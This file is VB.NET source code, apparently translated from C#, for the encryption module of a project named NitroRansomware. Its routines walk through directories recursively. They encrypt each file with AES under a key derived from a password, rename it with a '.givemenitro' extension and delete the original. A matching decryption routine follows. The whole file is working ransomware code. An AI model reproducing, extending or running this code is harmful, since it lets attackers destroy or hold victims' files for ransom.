Imports System
Imports System.Text
Imports System.Security.Cryptography
Imports System.IO
Imports System.Collections.Generic
Namespace NitroRansomware
	Friend Class Crypto
		Public Shared encryptedCount As Integer = 0
		Private Shared logging As New Logs("DEBUG", 0)
		Private Shared fExtension As String = ".givemenitro"
		Public Shared fPassword As String = Program.DECRYPT_PASSWORD
		Public Shared inPassword As String
		Public Shared encryptedFileLog As New List(Of String)()
		Public Shared Sub EncryptContent(ByVal path As String)
			Try
				For Each file As String In Directory.GetFiles(path)
					If Not file.Contains(fExtension) Then
						logging.Debug("Encrypting: " & file)
						encryptedFileLog.Add(file)
						EncryptFile(file, fPassword)
					End If
				Next file

				For Each dire As String In Directory.GetDirectories(path)
					EncryptContent(dire)
				Next dire
			Catch ex As Exception
				logging.Error(ex.Message)
			End Try

		End Sub
		Public Shared Sub DecryptContent(ByVal path As String)
			Try
				For Each file As String In Directory.GetFiles(path)
					If IsEncrypted(file) Then

							logging.Debug("Decrypting: " & file)
							DecryptFile(file, file.Substring(0, file.Length - fExtension.Length), inPassword)


					End If
				Next file

				For Each dire As String In Directory.GetDirectories(path)
					DecryptContent(dire)
				Next dire
			Catch ex As Exception
				logging.Error(ex.Message)
			End Try
		End Sub
		Private Shared Function IsEncrypted(ByVal file As String) As Boolean
			If file.Contains(fExtension) Then
				If file.Substring(file.Length - fExtension.Length, fExtension.Length) = fExtension Then
					Return True
				End If
			End If
			Return False
		End Function
		Private Shared Sub EncryptFile(ByVal filePath As String, ByVal password As String)
			Dim salt(31) As Byte
			Dim rng As New RNGCryptoServiceProvider()
			For x As Integer = 0 To 9
				rng.GetBytes(salt)
			Next x
			rng.Dispose()

			Dim fsCrypt As New FileStream(filePath & fExtension, FileMode.Create)
			Dim passwordBytes() As Byte = Encoding.UTF8.GetBytes(password)

			Dim AES As New RijndaelManaged()
			AES.KeySize = 256
			AES.BlockSize = 128
			AES.Padding = PaddingMode.PKCS7

			Dim key = New Rfc2898DeriveBytes(passwordBytes, salt, 50000)
			AES.Key = key.GetBytes(AES.KeySize \ 8)
			AES.IV = key.GetBytes(AES.BlockSize \ 8)
			AES.Mode = CipherMode.CBC

			fsCrypt.Write(salt, 0, salt.Length)

			Dim cs As New CryptoStream(fsCrypt, AES.CreateEncryptor(), CryptoStreamMode.Write)
			Dim fsIn As New FileStream(filePath, FileMode.Open)

			Dim buffer(1048575) As Byte
			Dim read As Integer
			Try
'INSTANT VB WARNING: An assignment within expression was extracted from the following statement:
'ORIGINAL LINE: while ((read = fsIn.Read(buffer, 0, buffer.Length)) > 0)
				read = fsIn.Read(buffer, 0, buffer.Length)
				Do While read > 0
					cs.Write(buffer, 0, read)
					read = fsIn.Read(buffer, 0, buffer.Length)
				Loop
				fsIn.Close()
			Catch ex As Exception
				logging.Error(ex.Message)
			Finally
				logging.Info("Encypted " & filePath)
				encryptedCount += 1
				cs.Close()
				fsCrypt.Close()
				File.Delete(filePath)
			End Try

		End Sub
		Private Shared Sub DecryptFile(ByVal inputFile As String, ByVal outputFile As String, ByVal password As String)
			Dim passwordBytes() As Byte = System.Text.Encoding.UTF8.GetBytes(password)
			Dim salt(31) As Byte

			Dim cryptoFileStream As New FileStream(inputFile, FileMode.Open)
			cryptoFileStream.Read(salt, 0, salt.Length)

			Dim AES As New RijndaelManaged()
			AES.KeySize = 256
			AES.BlockSize = 128
			Dim key = New Rfc2898DeriveBytes(passwordBytes, salt, 50000)
			AES.Key = key.GetBytes(AES.KeySize \ 8)
			AES.IV = key.GetBytes(AES.BlockSize \ 8)
			AES.Padding = PaddingMode.PKCS7
			AES.Mode = CipherMode.CBC

			Dim cryptoStream As New CryptoStream(cryptoFileStream, AES.CreateDecryptor(), CryptoStreamMode.Read)
			Dim fileStreamOutput As New FileStream(outputFile, FileMode.Create)

			Dim read As Integer
			Dim buffer(1048575) As Byte
			Try
'INSTANT VB WARNING: An assignment within expression was extracted from the following statement:
'ORIGINAL LINE: while ((read = cryptoStream.Read(buffer, 0, buffer.Length)) > 0)
				read = cryptoStream.Read(buffer, 0, buffer.Length)
				Do While read > 0
					fileStreamOutput.Write(buffer, 0, read)
					read = cryptoStream.Read(buffer, 0, buffer.Length)
				Loop
			Catch ex_CryptographicException As CryptographicException
				logging.Error("CryptographicException error: " & ex_CryptographicException.Message)
			Catch ex As Exception
				logging.Error(ex.Message)
			End Try
			Try
				cryptoStream.Close()
				logging.Info("Decrypted: " & inputFile)
			Catch ex As Exception
				logging.Error("Error by closing CryptoStream: " & ex.Message)
			Finally
				fileStreamOutput.Close()
				cryptoFileStream.Close()
			End Try
		End Sub

	End Class
End Namespace
